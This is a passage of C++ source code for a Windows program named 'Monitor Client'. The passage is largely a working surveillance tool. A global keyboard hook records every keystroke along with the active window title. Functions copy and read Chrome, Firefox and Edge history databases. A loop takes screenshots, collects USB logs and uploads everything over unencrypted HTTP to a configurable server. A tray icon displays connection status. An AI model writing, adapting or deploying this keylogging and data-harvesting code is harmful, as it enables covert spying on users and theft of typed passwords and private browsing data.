        return "";
    }
    
    // Read file
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    // Create multipart form data
    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount());
    std::string contentType = "multipart/form-data; boundary=" + boundary;
    
    std::string formData = "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + filePath + "\"\r\n";
    formData += "Content-Type: image/jpeg\r\n\r\n";
    formData += fileContent + "\r\n";
    
    // Add username to form data
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"Username\"\r\n\r\n";
    formData += username + "\r\n";
    
    formData += "--" + boundary + "--\r\n";
    
    // Create HTTP request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath.c_str(), NULL, NULL, NULL, 
                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }
    
    // Set headers
    std::string headers = "Content-Type: " + contentType + "\r\n";
    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send request
    BOOL result = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)formData.c_str(), formData.length());
    
    std::string response;
    if (result) {
        char buffer[1024];
        DWORD bytesRead;
        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return response;
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            
            std::string application = getActiveWindowTitle();
            std::string keyName = getKeyName(kbStruct->vkCode, kbStruct->scanCode, kbStruct->flags);
            std::string timestamp = getCurrentDateTimeString();
            
            // Check for modifier keys
            std::string modifiers;
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers += "Ctrl+";
            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers += "Shift+";
            if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers += "Alt+";
            if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) modifiers += "Win+";
            
            std::string fullKeyName = modifiers + keyName;
            
            Json::Value keyLog;
            keyLog["date"] = timestamp;
            keyLog["application"] = application;
            keyLog["key"] = fullKeyName;
            
            std::lock_guard<std::mutex> lock(dataMutex);
            keyLogs.push_back(keyLog);
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Setup keyboard hook
void setupKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Failed to set keyboard hook" << std::endl;
    }
}

// Remove keyboard hook
void removeKeyboardHook() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

// Collect browser history
void collectBrowserHistory() {
    // Chrome history
    std::string chromeHistory = getChromeHistory(lastChromeFetch);
    if (!chromeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(chromeHistory, historyArray)) {
            int64_t maxTime = lastChromeFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Chrome";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastChromeFetch) {
                lastChromeFetch = maxTime;
                writeDebugLog("Updated Chrome last fetch time to: " + std::to_string(lastChromeFetch));
            }
        }
    }
    
    // Firefox history
    std::string firefoxHistory = getFirefoxHistory(lastFirefoxFetch);
    if (!firefoxHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(firefoxHistory, historyArray)) {
            int64_t maxTime = lastFirefoxFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Firefox";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastFirefoxFetch) {
                lastFirefoxFetch = maxTime;
                writeDebugLog("Updated Firefox last fetch time to: " + std::to_string(lastFirefoxFetch));
            }
        }
    }
    
    // Edge history
    std::string edgeHistory = getEdgeHistory(lastEdgeFetch);
    if (!edgeHistory.empty()) {
        Json::Value historyArray;
        Json::Reader reader;
        if (reader.parse(edgeHistory, historyArray)) {
            int64_t maxTime = lastEdgeFetch;
            for (const auto& entry : historyArray) {
                Json::Value history;
                history["browser"] = "Edge";
                history["url"] = entry["url"];
                history["title"] = entry["title"];
                history["last_visit"] = entry["last_visit"];
                history["date"] = getCurrentDateTimeString();
                
                // Track the latest time we've seen
                int64_t visitTime = entry["last_visit"].asInt64();
                if (visitTime > maxTime) {
                    maxTime = visitTime;
                }
                
                std::lock_guard<std::mutex> lock(dataMutex);
                browserHistories.push_back(history);
            }
            // Update the last fetch time
            if (maxTime > lastEdgeFetch) {
                lastEdgeFetch = maxTime;
                writeDebugLog("Updated Edge last fetch time to: " + std::to_string(lastEdgeFetch));
            }
        }
    }
}

// Get Chrome history
std::string getChromeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string chromePath = std::string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_chrome_history.db";
    if (!CopyFileA(chromePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = chromePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Chrome query with sinceTime: " + std::to_string(sinceTime));
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Chrome query without sinceTime (first run)");
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != chromePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Firefox history
std::string getFirefoxHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* appData;
    size_t len;
    _dupenv_s(&appData, &len, "APPDATA");
    if (!appData) return "";
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
    free(appData);
#else
    const char* appData = getenv("APPDATA");
    if (!appData) return "";
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
#endif
    
    // Find all profiles, prefer default profile
    std::string profilePath;
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((firefoxPath + "\\*.default*").c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        // Found default profile
        profilePath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
        FindClose(hFind);
    } else {
        // Try to find any profile
        hFind = FindFirstFileA((firefoxPath + "\\*").c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::string testPath = firefoxPath + "\\" + findData.cFileName + "\\places.sqlite";
                    if (GetFileAttributesA(testPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                        profilePath = testPath;
                        break;
                    }
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    if (profilePath.empty()) {
        return "";
    }
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_firefox_history.db";
    if (!CopyFileA(profilePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = profilePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL AND last_visit_date > " + std::to_string(sinceTime) + " ORDER BY last_visit_date DESC LIMIT 100";
        writeDebugLog("Firefox query with sinceTime: " + std::to_string(sinceTime));
    } else {
        query = "SELECT url, title, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100";
        writeDebugLog("Firefox query without sinceTime (first run)");
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != profilePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Get Edge history
std::string getEdgeHistory(int64_t sinceTime) {
#ifdef _MSC_VER
    char* localAppData;
    size_t len;
    _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
    free(localAppData);
#else
    const char* localAppData = getenv("LOCALAPPDATA");
    if (!localAppData) return "";
    std::string edgePath = std::string(localAppData) + "\\Microsoft\\Edge\\User Data\\Default\\History";
#endif
    
    // Create a temporary copy of the database to avoid locking issues
    std::string tempPath = "temp_edge_history.db";
    if (!CopyFileA(edgePath.c_str(), tempPath.c_str(), FALSE)) {
        // If copy fails, try to access the original
        tempPath = edgePath;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
        return "";
    }
    
    std::string query;
    if (sinceTime > 0) {
        query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time > " + std::to_string(sinceTime) + " ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Edge query with sinceTime: " + std::to_string(sinceTime));
    } else {
        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        writeDebugLog("Edge query without sinceTime (first run)");
    }
    sqlite3_stmt* stmt;
    
    Json::Value historyArray(Json::arrayValue);
    
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            Json::Value entry;
            const char* url = (char*)sqlite3_column_text(stmt, 0);
            const char* title = (char*)sqlite3_column_text(stmt, 1);
            
            if (url && title) {
                entry["url"] = url;
                entry["title"] = title;
                entry["last_visit"] = sqlite3_column_int64(stmt, 2);
                historyArray.append(entry);
            }
        }
        sqlite3_finalize(stmt);
    }
    
    sqlite3_close(db);
    
    // Clean up temporary file
    if (tempPath != edgePath) {
        DeleteFileA(tempPath.c_str());
    }
    
    Json::FastWriter writer;
    return writer.write(historyArray);
}

// Main monitoring task
void monitorTask() {
    auto lastScreenshot = std::chrono::steady_clock::now();
    auto lastTic = std::chrono::steady_clock::now();
    auto lastHistory = std::chrono::steady_clock::now();
    auto lastKeyLog = std::chrono::steady_clock::now();
    auto lastUSBLog = std::chrono::steady_clock::now();
    auto lastConnectionTest = std::chrono::steady_clock::now();
    
    // Test initial connection
    if (!testServerConnection()) {
        showConnectionError("Cannot connect to server: " + API_BASE_URL);
    }
    
    while (activeRunning) {
        auto now = std::chrono::steady_clock::now();
        
        // Test connection every 60 seconds
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastConnectionTest).count() >= 60) {
            testServerConnection();
            lastConnectionTest = now;
        }
        
        // Screenshot
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastScreenshot).count() >= screenInterval) {
            std::string screenshotPath = takeScreenshot();
            sendScreenshot(screenshotPath);
            lastScreenshot = now;
        }
        
        // Tic event
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTic).count() >= TIC_INTERVAL) {
            sendTicEvent();
            lastTic = now;
        }
        
        // Browser history
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastHistory).count() >= HISTORY_INTERVAL) {
            collectBrowserHistory();
            sendBrowserHistories();
            lastHistory = now;
        }
        
        // Key logs
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastKeyLog).count() >= KEY_INTERVAL) {
            sendKeyLogs();
            lastKeyLog = now;
        }
        
        // USB logs
        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastUSBLog).count() >= 30) {
            sendUSBLogs();
            lastUSBLog = now;
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Main function
int main() {
    // Set DPI awareness to handle scaling properly (MinGW compatible)
    SetProcessDPIAware();
    
    // Initialize COM for GDI+
    CoInitialize(NULL);
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Warning: Could not initialize Winsock" << std::endl;
    }
    
    // Get MAC address
    macAddress = getMacAddress();
    if (macAddress.empty()) {
        std::cerr << "Warning: Could not get MAC address" << std::endl;
    }
    
    // Load settings from settings.ini
    if (!loadSettings()) {
        std::cerr << "Error: Could not load settings.ini" << std::endl;
        return 1;
    }
    
    // Setup keyboard monitoring
    setupKeyboardHook();
    
    // Setup USB monitoring
    setupUSBMONITORING();
    writeDebugLog("USB monitoring setup completed");
    
    // Setup system tray
    setupSystemTray();
    writeDebugLog("System tray setup completed");
    
    // Start monitoring thread
    std::thread monitorThread(monitorTask);
    writeDebugLog("Monitoring thread started");
    
    // Message loop for system tray
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        // Check if we should exit
        if (msg.message == WM_QUIT) {
            break;
        }
    }
    
    // Cleanup
    activeRunning = false;
    monitorThread.join();
    removeKeyboardHook();
    cleanupUSBMONITORING();
    cleanupSystemTray();

    CoUninitialize();
    WSACleanup();
    
    return 0;
}

// Write debug log to file
void writeDebugLog(const std::string& message) {
    std::ofstream logFile("monitor_debug.log", std::ios::app);
    if (logFile.is_open()) {
        std::string timestamp = getCurrentDateTimeString();
        logFile << "[" << timestamp << "] " << message << std::endl;
        logFile.close();
    }
} 

// Load settings from settings.ini
bool loadSettings() {
    std::ifstream settingsFile("settings.ini");
    if (!settingsFile.is_open()) {
        writeDebugLog("settings.ini not found. Using default settings.");
        serverIP = "192.168.1.45";
        serverPort = "8924";
        username = "default_user";
        API_BASE_URL = "http://" + serverIP + ":" + serverPort;
        return true;
    }

    std::string line;
    std::string currentSection = "";
    
    while (std::getline(settingsFile, line)) {
        // Remove leading/trailing whitespace
        line.erase(0, line.find_first_not_of(" \t"));
        line.erase(line.find_last_not_of(" \t") + 1);
        
        // Skip empty lines and comments
        if (line.empty() || line[0] == ';' || line[0] == '#') {
            continue;
        }
        
        // Check for section headers
        if (line[0] == '[' && line[line.length()-1] == ']') {
            currentSection = line.substr(1, line.length()-2);
            continue;
        }
        
        // Parse key-value pairs
        size_t equalPos = line.find('=');
        if (equalPos != std::string::npos) {
            std::string key = line.substr(0, equalPos);
            std::string value = line.substr(equalPos + 1);
            
            // Remove leading/trailing whitespace from key and value
            key.erase(0, key.find_first_not_of(" \t"));
            key.erase(key.find_last_not_of(" \t") + 1);
            value.erase(0, value.find_first_not_of(" \t"));
            value.erase(value.find_last_not_of(" \t") + 1);
            
            if (currentSection == "Server") {
                if (key == "ip") {
                    serverIP = value;
                } else if (key == "port") {
                    serverPort = value;
                } else if (key == "username") {
                    username = value;
                }
            }
        }
    }
    settingsFile.close();

    API_BASE_URL = "http://" + serverIP + ":" + serverPort;
    writeDebugLog("Loaded settings: ServerIP=" + serverIP + ", ServerPort=" + serverPort + ", Username=" + username);
    return true;
}

// Setup system tray
void setupSystemTray() {
    // Register window class for the tray icon
    WNDCLASSEXA wcex;
    ZeroMemory(&wcex, sizeof(WNDCLASSEXA));
    wcex.cbSize = sizeof(WNDCLASSEXA);
    wcex.lpfnWndProc = WindowProc;
    wcex.hInstance = GetModuleHandleA(NULL);
    wcex.hIcon = LoadIconA(NULL, (LPCSTR)IDI_APPLICATION);
    wcex.hCursor = LoadCursorA(NULL, (LPCSTR)IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszClassName = "MonitorTrayIcon";
    
    if (!RegisterClassExA(&wcex)) {
        writeDebugLog("Failed to register window class for tray icon.");
        return;
    }

    // Create the main window (hidden)
    hMainWindow = CreateWindowExA(
        0, 
        "MonitorTrayIcon", 
        "Monitor Client", 
        WS_OVERLAPPED, 
        0, 0, 0, 0, 
        NULL, NULL, 
        GetModuleHandleA(NULL), 
        NULL
    );
    
    if (!hMainWindow) {
        writeDebugLog("Failed to create main window for tray icon.");
        return;
    }
    
    ShowWindow(hMainWindow, SW_HIDE); // Hide the main window

    // Create the tray icon
    ZeroMemory(&nid, sizeof(NOTIFYICONDATAA));
    nid.cbSize = sizeof(NOTIFYICONDATAA);
    nid.hWnd = hMainWindow;
    nid.uID = 1; // Unique ID for this icon
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIconA(NULL, (LPCSTR)IDI_APPLICATION);
    strcpy_s(nid.szTip, "Monitor Client");

    if (!Shell_NotifyIconA(NIM_ADD, &nid)) {
        DWORD error = GetLastError();
        writeDebugLog("Failed to add tray icon. Error: " + std::to_string(error));
        return;
    }

    // Create context menu (will be updated dynamically)
    hTrayMenu = CreatePopupMenu();

    // Set the tray icon and menu
    updateTrayIcon();
    updateTrayMenu();
    
    writeDebugLog("System tray setup completed successfully.");
}

// Cleanup system tray
void cleanupSystemTray() {
    Shell_NotifyIconA(NIM_DELETE, &nid);
    if (hTrayMenu) {
        DestroyMenu(hTrayMenu);
        hTrayMenu = NULL;
    }
    if (hMainWindow) {
        DestroyWindow(hMainWindow);
        hMainWindow = NULL;
    }
}

// Window procedure for the main window
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_TRAYICON:
            if (lParam == WM_RBUTTONUP) {
                POINT pt;
                GetCursorPos(&pt);
                SetForegroundWindow(hwnd); // Bring window to foreground
                updateTrayMenu(); // Update menu with current status
                TrackPopupMenu(hTrayMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
            }
            return 0;
        case WM_COMMAND:
            // No menu items to handle
            return 0;
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(hwnd, uMsg, wParam, lParam);
}



// Update tray icon based on connection status
void updateTrayIcon() {
    if (connectionStatus.serverConnected) {
        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
        nid.hIcon = LoadIconA(NULL, (LPCSTR)IDI_INFORMATION); // Green information icon
        strcpy_s(nid.szTip, "Monitor Client (Connected)");
    } else {
        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
        nid.hIcon = LoadIconA(NULL, (LPCSTR)IDI_ERROR); // Red error icon
        strcpy_s(nid.szTip, "Monitor Client (Disconnected)");
    }
    Shell_NotifyIconA(NIM_MODIFY, &nid);
}

// Show connection error notification
void showConnectionError(const std::string& error) {
    showToastNotification("Connection Error", error, "error");
    connectionStatus.lastError = error;
    connectionStatus.lastSuccess = std::chrono::steady_clock::now();
    updateTrayIcon();
}

// Test server connection
bool testServerConnection() {
    std::string url = API_BASE_URL + TIC_ROUTE;
    std::string response = httpPost(url, "{\"Event\":\"Ping\",\"Version\":\"1.0\",\"MacAddress\":\"" + macAddress + "\"}");
    
    Json::Value root;
    Json::Reader reader;
    if (reader.parse(response, root)) {
        if (root.isMember("Status") && root["Status"].asString() == "OK") {
            connectionStatus.serverConnected = true;
            connectionStatus.lastSuccess = std::chrono::steady_clock::now();
            updateTrayIcon();
            checkConnectionStatusChange();
            return true;
        } else {
            connectionStatus.serverConnected = false;
            connectionStatus.lastError = "Server responded with error: " + response;
            updateTrayIcon();
            checkConnectionStatusChange();
            return false;
        }
    } else {
        connectionStatus.serverConnected = false;
        connectionStatus.lastError = "Failed to parse server response: " + response;
        updateTrayIcon();
        checkConnectionStatusChange();
        return false;
    }
} 

// Helper function to get the local network IPv4 address (robust version)
std::string getLocalIPAddress() {
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL) {
        return "Unknown";
    }

    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return "Unknown";
        }
    }

    std::string foundIP = "Unknown";
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
            while (pIPAddr) {
                std::string ip = pIPAddr->IpAddress.String;
                // Skip empty, 0.0.0.0, loopback, APIPA, and IPv6-mapped addresses
                if (!ip.empty() && ip != "0.0.0.0" &&
                    ip.substr(0, 4) != "127." &&
                    ip.substr(0, 8) != "169.254." &&
                    ip.find(':') == std::string::npos) {
                    foundIP = ip;
                    break;
                }
                pIPAddr = pIPAddr->Next;
            }
            if (foundIP != "Unknown") break;
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
    return foundIP;
} 